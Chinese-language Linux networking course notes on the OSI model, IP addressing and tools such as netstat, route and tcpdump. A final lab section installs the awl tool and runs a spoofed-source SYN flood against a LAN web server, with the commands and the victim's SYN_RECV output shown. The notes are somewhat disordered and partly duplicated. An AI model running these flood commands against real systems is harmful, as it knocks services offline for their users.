# Linux网络管理技术
1. OSI七层模型和TCP/IP
2. linux网络相关的调试命令
3. 实战-在局域网中使用 awl伪装MAC地址进行多线程SYN洪水攻击

# 1. OSI七层模型和TCP/IP
- OSI七层模型：OSI（Open System Interconnection）开放系统互连参考模型是国际标准化组织（ISO）制定的一个用于计算机或通信系统间互联的标准体系。
- TCP/IP四层模型：TCP/IP参考模型是计算机网络的祖父ARPANET和其后继的因特网使用的参考模型。
- 七层模型优点：
  1. 把复杂的网络划分成为更容易管理的层（将整个庞大而复杂的问题划分为若干个容易处理的小问题）
  2. 没有一个厂家能完整的提供整套解决方案和所有的设备，协议. 
  3. 独立完成各自该做的任务，互不影响，分工明确，上层不关心下层具体细节，分层同样有益于网络排错
  功能与代表设备
- TCP与UDP的区别：
  1. 基于连接与无连接；
  2. 对系统资源的要求（TCP较多，UDP少）；
  3. UDP程序结构较简单；UDP信息包的标题很短，只有8个字节，相对于TCP的20个字节信息包的额外开销很小。所以传输速度可更快
  4. TCP保证数据正确性，UDP可能丢包；TCP保证数据顺序，UDP不保证。
  场景： 视频，语音通讯使用udp，或网络环境很好，比如局域网中通讯可以使用udp。  udp数据传输完整性，可以通过应用层的软件来校对就可以了。
  tcp传文件，数据完整性要求高。
- 如果你不知道哪个端口对应哪个服务怎么办？如873端口是哪个服务的？
  ```
  [root@localhost ~]# vim /etc/services 
  ```
  此文件可以查看常用端口对应的名字。iptables或netstat要把端口解析成协议名时，都需要使用到这个文件。另外后期xinetd服务管理一些小服务时，也会使用到此文件来查询对应的小服务端口号。注：有的服务是UDP和TCP端口都会监听的
  
- IP地址分类, 常见的地址是A、B、C 三类
  1. A类地址:范围从0-127，0是保留的并且表示所有IP地址，而127也是保留的地址，并且是用于测试环回口用的。因此A类地址的可用的范围其实是从1-126之间。以子网掩码：255.0.0.0.
  2. B类地址：范围从128-191，如172.168.1.1，以子网掩码来进行区别：255.255.0.0
  3. C类地址：范围从192-223，以子网掩码来进行区别： 255.255.255.0
    - ABC 3类中私有IP地址范围：
      - A： 10.0.0.0--10.255.255.255  /8
      - B:  172.16.0.0--172.31.255.255  /16
      - C:  192.168.0.0--192.168.255.255  /24
  4. D类地址：范围从224-239，被用在多点广播(Multicast)中。多点广播地址用来一次寻址一组计算机，它标识共享同一协议的一组计算机。
  5. E类地址：范围从240-254，为将来使用保留。 

> 互动： ping 127.0.0.1 可以ping通。ping 127.23.23.23 可以ping通吗？
> 结论：这个127这个网段都用于环回口
> ```
>  [root@localhost ~]# ping 127.3.4.5
>  PING 127.3.4.5 (127.3.4.5) 56(84) bytes of data.
>  64 bytes from 127.3.4.5: icmp_seq=1 ttl=64 time=0.105 ms
>  64 bytes from 127.3.4.5: icmp_seq=2 ttl=64 time=0.054 ms
>  ```

# 2. linux网络相关的调试命令

### 2.1 查看网络连接是否正常
```
[root@localhost ~]# mii-tool ens33
ens33: negotiated 1000baseT-FD flow-control, link ok
```
### 2.2 查看ip
```
[root@localhost ~]# ifconfig
```
常见的一些网络接口
- eth0 ..... eth4 ...   以太网接口(linux6)
- waln0      无线接口
- eno177776  以太网接口 (linux7)
- ens33   以太网接口(linux7)
- bond0  team0   网卡绑定接口
- virbr0  虚拟交换机桥接接口
- br0    虚拟网桥接口
- lo      本地回环接口
- vnet0   KVM虚拟机网卡接口

###  2.3 修改网卡IP地址 - 手工修改网卡配置文件

```
[root@localhost ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens33 

TYPE="Ethernet"         # 设置类型是以太网设备
PROXY_METHOD="none"
BROWSER_ONLY="no"
BOOTPROTO="dhcp"        # 参数：static静态IP 或dhcp 或none无（不指定），如是none，配上IP地址和static效果一样
DEFROUTE="yes"
IPV4_FAILURE_FATAL="no"
IPV6INIT="yes"
IPV6_AUTOCONF="yes"
IPV6_DEFROUTE="yes"
IPV6_FAILURE_FATAL="no"
IPV6_ADDR_GEN_MODE="stable-privacy"
NAME="ens33"            # 网卡名字
UUID="542350e0-61ad-4f1f-937b-7ee3c71f0f8d"        # 网卡UUID，全球唯一
DEVICE="ens33"          # 设备名字，在内核中识别的名字
ONBOOT="yes"            # 启用该设备，如果no，表示不启动此网络设备
IPADDR=192.168.0.162
PREFIX=24
GATEWAY=192.168.0.1
DNS1=114.114.114.114
DNS2=8.8.8.8
~                      
```

### 2.4 添加一个新网卡
vm add a new network adapter

```
[root@localhost ~]# ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.162  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::24cf:1100:bafc:e91e  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:57:73:32  txqueuelen 1000  (Ethernet)
        RX packets 11802  bytes 1338943 (1.2 MiB)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 304  bytes 31115 (30.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens39: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.89  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a652:9222:f87a:530d  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:57:73:3c  txqueuelen 1000  (Ethernet)
        RX packets 1273  bytes 103404 (100.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 4590 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
默认新增加的网卡没有配置文件，现在手动添加一个

```
[root@localhost ~]# cd /etc/sysconfig/network-scripts/

[root@localhost network-scripts]# cp ifcfg-ens33 ifcfg-ens39

[root@localhost network-scripts]# cp vim ifcfg-ens39
NAME=ens39
UUID=c713acec-674b-411d-9e61-646482a292ca   #这一行删除掉
DEVICE=ens39
IPADDR=192.168.0.33   #改成33 IP

[root@localhost ~]# systemctl restart NetworkManager   
[root@localhost ~]# ifconfig  #发现ens39 ，IP地址没有修改成功
[root@localhost ~]# service  network restart   #重启网络服务生效
[root@localhost ~]# ifconfig  #发现ens39 ，IP地址配置成功
```
- 启动关闭指定网卡
```
[root@localhost ~]# ifconfig ens39 down
[root@localhost ~]# ifconfig ens39 up
```
- 临时配置IP地址
```
[root@localhost ~]# ifconfig ens39 192.168.0.89
```
- 给一个网络临时配置多个IP地址
```
[root@localhost ~]# ifconfig ens39:1 192.168.3.3
```

### 2.5 查看端口的监听状态
netstat 命令： 查看系统中网络连接状态信息。常用的参数格式 :  ```netstat -anutp```  
- a, --all  显示本机所有连接和监听的端口
- n, --numeric    don't resolve names  以数字形式显示当前建立的有效连接和端口
- u  显示udp协议连接
- t  显示tcp协议连接
- p, --programs   显示连接对应的PID与程序名

```
[root@localhost ~]# netstat -anutp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd              
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      9503/sshd           
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      9502/cupsd          
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      9816/master         
tcp        0      0 192.168.0.162:22        192.168.0.219:4737      ESTABLISHED 11920/sshd: root@pt 
tcp        0      0 192.168.0.162:22        192.168.0.219:4434      ESTABLISHED 10353/sshd: root@pt 
```
- Proto===连接协议的种类
- Recv-Q====接收到字节数
- Send-Q====从本服务器，发出去的字节数
- Local Address====本地的IP地址，可以是IP，也可以是主机名
- Foreign Address====远程主机的IP 地址
- 网络连接状态STATE:
  - CLOSED ： 初始（无连接）状态。
  - LISTEN ：  侦听状态，等待远程机器的连接请求。
  - ESTABLISHED： 完成TCP三次握手后，主动连接端进入ESTABLISHED状态。此时，TCP连接已经建立，可以进行通信。
  - TIME_WAIT ：  在TCP四次挥手时，主动关闭端发送了ACK包之后，进入TIME_WAIT状态，等待最多MSL时间，让被动关闭端收到ACK包。
    - MSL，即Maximum Segment Lifetime，一个数据分片（报文）在网络中能够生存的最长时间，在RFC 793中定义MSL通常为2分钟，即超过两分钟即认为这个报文已经在网络中被丢弃了。对于一个TCP连接，在双方进入TIME_WAIT后，通常会等待2倍MSL时间后，再关闭掉连接，作用是为了防止由于FIN报文丢包，对端重发导致与后续的TCP连接请求产生顺序混乱

- 实战：服务器上有大量TIME_WAI连接，如何优化TCP连接，快速释放tcp连接 ？
> [root@localhost ~]# netstat  -antup | grep   TIME_WAI 
> tcp        0      0 123.57.82.225:80            111.196.245.241:4002        TIME_WAIT   -                   
> tcp        0      0 123.57.82.225:80            111.196.245.241:3970        TIME_WAIT   -                   
> tcp        0      0 123.57.82.225:80            111.196.245.241:4486        TIME_WAIT   -                   
> tcp        0      0 123.57.82.225:80            111.196.245.241:3932        TIME_WAIT   -                   
> tcp        0      0 123.57.82.225:80            111.196.245.241:3938        TIME_WAIT   -   

```
[root@localhost ~]# cat /proc/sys/net/ipv4/tcp_fin_timeout 
60

[root@localhost ipv4]# echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout  #通过缩短时间time_wait时间来快速释放链接
```

### 2.6 路由信息
```
[root@localhost ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.0.1     0.0.0.0         UG    100    0        0 ens33
192.168.0.0     0.0.0.0         255.255.255.0   U     100    0        0 ens33
192.168.3.0     0.0.0.0         255.255.255.0   U     0      0        0 ens39
192.168.122.0   0.0.0.0         255.255.255.0   U     0      0        0 virbr0
```
注：```0.0.0.0         192.168.0.1     0.0.0.0         UG    100    0        0 ens33```, 0.0.0.0是32位二进制转换成十进制的写法。32位子网掩码都为0。表示IP地址32位都是主机位。如果IP地址是0.0.0.0，子网掩码也是0.0.0.0，则表示所有的IP地址，或者是没有IP地址。

- 添加路由```route add -net 192.168.2.0 netmask 255.255.255.0 dev ens38```
- 删除路由```route del -net 192.168.2.0 netmask 255.255.255.0```
- 路由跟踪：查看经过多少个路由器到目标网址，实战场景： 新上线的服务器，北京用户需要经过几跳可以到达服务器
```
[root@localhost ~]# traceroute naver.com
traceroute to naver.com (125.209.222.141), 30 hops max, 60 byte packets
 1  gateway (192.168.0.1)  0.492 ms  0.468 ms  0.530 ms
 2  1.229.228.1 (1.229.228.1)  3.684 ms  3.353 ms  4.616 ms
 3  100.79.2.189 (100.79.2.189)  8.376 ms  7.785 ms  7.931 ms
 4  221.138.184.9 (221.138.184.9)  0.926 ms  1.338 ms 221.138.62.101 (221.138.62.101)  1.512 ms
 5  10.45.254.94 (10.45.254.94)  1.523 ms 10.45.254.78 (10.45.254.78)  1.895 ms 10.45.254.94 (10.45.254.94)  1.619 ms
 6  10.222.8.208 (10.222.8.208)  9.499 ms 10.222.8.204 (10.222.8.204)  7.103 ms 10.222.8.196 (10.222.8.196)  9.353 ms
 7  1.255.23.218 (1.255.23.218)  1.759 ms 1.255.74.183 (1.255.74.183)  2.207 ms 1.255.23.218 (1.255.23.218)  2.344 ms
 8  211.176.57.26 (211.176.57.26)  3.464 ms  3.026 ms 211.176.57.30 (211.176.57.30)  2.844 ms
 9  10.22.69.98 (10.22.69.98)  3.537 ms 10.22.67.2 (10.22.67.2)  4.034 ms 10.22.68.122 (10.22.68.122)  4.758 ms
10  10.118.2.98 (10.118.2.98)  4.227 ms 10.118.2.22 (10.118.2.22)  3.910 ms 10.118.2.70 (10.118.2.70)  4.992 ms
11  * * *
12  * * *
```

### 2.7 ping & arping & watch
- ping命令的一般格式为：
  - c 数目 在发送指定数目的包后停止。
  - i 秒数 设定间隔几秒送一个网络封包给一台机器，预设值是一秒送一次。?????```ping -i 0.01 192.168.0.1```->```ping: bad timing interval```
  - I 指定从哪个端口出去。```ping -I ens33 192.168.0.1  ```
  
- IP地址冲突后或网关冲突
  ```
  [root@localhost ~]# arping -I ens33 192.168.0.1
  ARPING 192.168.0.1 from 192.168.0.162 ens33
  Unicast reply from 192.168.0.1 [90:6C:AC:B3:0B:C4]  1.318ms
  Unicast reply from 192.168.0.1 [90:6C:AC:B3:0B:C4]  1.023ms
  ```
  如果返回的mac不同，则出现来IP冲突的情况

- watch 实时监测命令的运行结果，可以看到所有变化数据包的大小
  - d, --differences   #高亮显示指令输出信息不同之处；
  - n, --interval seconds  #指定指令执行的间隔时间（秒）；
  - 每隔1秒高亮差异显示ens33相关信息```watch -d -n 1  "ifconfig ens33"```
  
# 3. 实战-局域网中使用awl伪装MAC地址进行多线程SYN洪水攻击

### 3.1 三次握手的核心是： 确认每一次包的序列号。tcp三次握手过程：
1. 首先由Client发出请求连接即 SYN=1，声明自己的序号是 seq=x
2. 然后Server 进行回复确认，即 SYN=1 ，声明自己的序号是 seq=y, 并设置为ack=x+1,
3. 最后Client 再进行一次确认，设置  ack=y+1.

> 服务器端：LISTEN：侦听来自远方的TCP端口的连接请求
> 
> 客户端：SYN-SENT：在发送连接请求后等待匹配的连接请求
> 
> 服务器端：SYN-RECEIVED：在收到和发送一个连接请求后等待对方对连接请求的确认
> 
> 客户端/服务器端：ESTABLISHED：代表一个打开的连接

### 3.2 tcpdump 抓包工具
- tcpdump常用参数：
  - c,        指定包个数
  - n,       IP，端口用数字方式显示
  - port,   指定端口 
  - S, client主机返回ACK绝对序号
  
- 互动：如何产生tcp的链接？在centos7上登录centos7，抓取ssh远程登录6时，产生的tcp三次握手包

  > issue: centos7 ssh to centos 6. ```ssh: connect to host 192.168.0.11 port 22: Connection refused```

  **1. go to centos6**
    ```
    [root@localhost ~]# service iptables stop
    [root@localhost ~]# service iptables status
    iptables：未运行防火墙。                            # still cannot ssh

    [root@localhost ~]# /etc/init.d/sshd restart
    停止 sshd：                                               [失败]
    生成 SSH2 RSA 主机键：                                     [确定]
    生成 SSH1 RSA 主机键：                                     [确定]
    正在生成 SSH2 DSA 主机键：                                 [确定]
    正在启动 sshd：                                            [确定]
    ```
  **2. go to centos7**
    - run in one cmd
      ```
      [root@localhost ~]# tcpdump -n -c 3 port 22 -S -i ens33
      tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
      listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 
      ```
    - run in another cmd
      ```
      [root@localhost ~]# ssh root@192.168.0.11
      root@192.168.0.11's password:               # stop here with no pw input

      ```
    - go to the first cmd
      ```
      [root@localhost ~]# tcpdump -n -c 3 port 22 -S -i ens33
      tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
      listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
      00:51:19.157928 IP 192.168.0.100.33722 > 192.168.0.11.ssh: Flags [S], seq 2296476984, win 29200, options [mss 1460,sackOK,TS val 596461 ecr 0,nop,wscale 7], length 0

      00:51:19.158427 IP 192.168.0.11.ssh > 192.168.0.100.33722: Flags [S.], seq 2783925694, ack 2296476985, win 14480, options [mss 1460,sackOK,TS val 489701 ecr 596461,nop,wscale 7], length 0

      00:51:19.158475 IP 192.168.0.100.33722 > 192.168.0.11.ssh: Flags [.], ack 2783925695, win 229, options [nop,nop,TS val 596462 ecr 489701], length 0
      3 packets captured
      3 packets received by filter
      0 packets dropped by kernel
      ```
        - seq 2296476984 -> ack 2296476985
        - seq 2783925694 -> ack 2783925695

        - Flags [S]  中的 S 表示为SYN包为1
        - client主机返回ACK，包序号为ack=1 ，这是相对序号，如果需要看绝对序号，可以在tcpdump命令中加-S

### 3.3 SYN洪水攻击的过程
  在服务端返回一个确认的SYN-ACK包的时候有个潜在的弊端，如果发起的客户是一个不存在的客户端，那么服务端就不会接到客户端回应的ACK包。
这时服务端需要耗费一定的数量的系统内存来等待这个未决的连接，直到等待超关闭，才能施放内存。

  如果恶意者通过通过ip欺骗，发送大量SYN包给受害者系统，导致服务端存在大量未决的连接并占用大量内存和tcp连接，从而导致正常客户端无法访问服务端，这就是SYN洪水攻击的过程。

  下载地址：https://gitlab.com/davical-project/awl/tags

- 安装
  ```
  [root@localhost63 ~]#tar zxvf awl-0.2.tar.gz  #解压
  [root@localhost63 ~]#cd awl-0.2
  [root@localhost63 awl-0.2]#./configure    # 查检软件包安装环境
  [root@localhost63 awl-0.2]#make  -j  4    # make  把源代码编译成可执行的二进制文件, -j 4以4个进程同时编译，速度快
  [root@localhost63 awl-0.2]#make install   # 安装
  [root@localhost63 awl-0.2]# which awl     # 查看安装的命令
  /usr/local/bin/awl
  ```
- awl参数如下:
  - i 发送包的接口,如果省略默认是eth0
  - m 指定目标mac地址, 注：如果-m没有指定mac，默认目标MAC地址是“FF.FF.FF.FF.FF.FF”，表示向同一网段内的所有主机发出ARP广播，进行SYN攻击，还容易使整个局域网瘫痪。
  - d 被攻击机器的IP
  - p 被攻击机器的端口
- 开始攻击
  ```
  [root@localhost ~]# ping 192.168.1.64

  [root@localhost ~]# arp -n     #   获取对方的IP地址解析成MAC地址
  Address                  HWtype  HWaddress           Flags Mask            Iface
  192.168.0.219            ether   bc:85:56:bb:8f:03   C                     ens33
  192.168.0.1              ether   90:6c:ac:b3:0b:c4   C                     ens33

  
  [root@localhost ~]# awl -i ens33 -m bc:85:56:bb:8f:03 -d 192.168.0.219 -p 80
  
  [root@localhost64 ~]# netstat -anutp | grep 80        # 在localhost64上查看：发现很多伪装成公网的IP在攻击
  C:\Users\xerox>netstat                                # windows

  활성 연결

    프로토콜  로컬 주소           외부 주소              상태
    TCP    127.0.0.1:1641         DESKTOP-7ET6EKR:5939   ESTABLISHED
    TCP    127.0.0.1:1838         DESKTOP-7ET6EKR:1839   ESTABLISHED
    TCP    127.0.0.1:1839         DESKTOP-7ET6EKR:1838   ESTABLISHED
    TCP    127.0.0.1:1882         DESKTOP-7ET6EKR:1883   ESTABLISHED
    TCP    127.0.0.1:1883         DESKTOP-7ET6EKR:1882   ESTABLISHED
    TCP    127.0.0.1:5939         DESKTOP-7ET6EKR:1641   ESTABLISHED
    TCP    192.168.0.219:445      KORSD09F2JPBXE:53002   ESTABLISHED
    TCP    192.168.0.219:1796     113.96.208.198:8080    ESTABLISHED
    TCP    192.168.0.219:1799     183.232.103.146:8080   ESTABLISHED
    TCP    192.168.0.219:1837     213.227.170.135:https  ESTABLISHED
    TCP    192.168.0.219:1849     52.230.3.194:https     ESTABLISHED
    TCP    192.168.0.219:4468     203.205.146.16:http    ESTABLISHED
    TCP    192.168.0.219:4622     221.228.75.150:9203    ESTABLISHED
    TCP    192.168.0.219:4737     192.168.0.162:ssh      ESTABLISHED
    TCP    192.168.0.219:4981     203.205.151.45:https   CLOSE_WAIT
    TCP    192.168.0.219:5302     203.205.219.54:http    CLOSE_WAIT
    TCP    192.168.0.219:5514     161.202.224.155:8080   CLOSE_WAIT
    TCP    192.168.0.219:5517     203.205.158.52:http    CLOSE_WAIT
  ```
  ![](https://i.loli.net/2019/03/04/5c7ceb298bef9.png)
  
  
  -----
  
# TCP 握手


> i. centos7 ssh to centos 6. ssh: connect to host 192.168.0.11 port 22: Connection refused

1. go to centos6
```
[root@localhost ~]# service iptables stop
[root@localhost ~]# service iptables status
iptables：未运行防火墙。                            # still cannot ssh

[root@localhost ~]# /etc/init.d/sshd restart
停止 sshd：                                               [失败]
生成 SSH2 RSA 主机键：                                     [确定]
生成 SSH1 RSA 主机键：                                     [确定]
正在生成 SSH2 DSA 主机键：                                  [确定]
正在启动 sshd：                                            [确定]
```
2.  go to centos7
run in one cmd
```
[root@localhost ~]# tcpdump -n -c 3 port 22 -S -i ens33
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes

```
run in another cmd
```
[root@localhost ~]# ssh root@192.168.0.11
root@192.168.0.11's password:               # stop here with no pw input

```
go to the first cmd
```
[root@localhost ~]# tcpdump -n -c 3 port 22 -S -i ens33
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
00:51:19.157928 IP 192.168.0.100.33722 > 192.168.0.11.ssh: Flags [S], seq 2296476984, win 29200, options [mss 1460,sackOK,TS val 596461 ecr 0,nop,wscale 7], length 0

00:51:19.158427 IP 192.168.0.11.ssh > 192.168.0.100.33722: Flags [S.], seq 2783925694, ack 2296476985, win 14480, options [mss 1460,sackOK,TS val 489701 ecr 596461,nop,wscale 7], length 0

00:51:19.158475 IP 192.168.0.100.33722 > 192.168.0.11.ssh: Flags [.], ack 2783925695, win 229, options [nop,nop,TS val 596462 ecr 489701], length 0
3 packets captured
3 packets received by filter
0 packets dropped by kernel
```
- seq 2296476984 -> ack 2296476985
- seq 2783925694 -> ack 2783925695



# 洪水攻击
1. centos6
```
yum -y install httpd
service httpd status
service httpd restart
```
2. centos7
```
[root@localhost ~]# awl -i ens33 -m 00:0c:29:08:86:b8 -d 192.168.0.11 -p 80
^Cpool_renew success
pthread join 0 is success !
pthread join 1 is success !
pthread join 2 is success !
pthread join 3 is success !
pthread join 4 is success !
pthread join 5 is success !
pthread join 6 is success !
pthread join 7 is success !
```
3. go back to cenos6
```
netstat -anutp | grep 80

tcp        0      0 192.168.0.11:80             162.180.33.66:30350         SYN_RECV    -                   
tcp        0      0 192.168.0.11:80             55.224.253.41:42381         SYN_RECV    -                   
tcp        0      0 192.168.0.11:80             1.44.16.75:33147            SYN_RECV    -                   
tcp        0      0 192.168.0.11:80             68.126.169.58:49177         SYN_RECV    -                   
tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      2800/master         
tcp        0      0 :::80                       :::*                        LISTEN      3811/httpd          

```
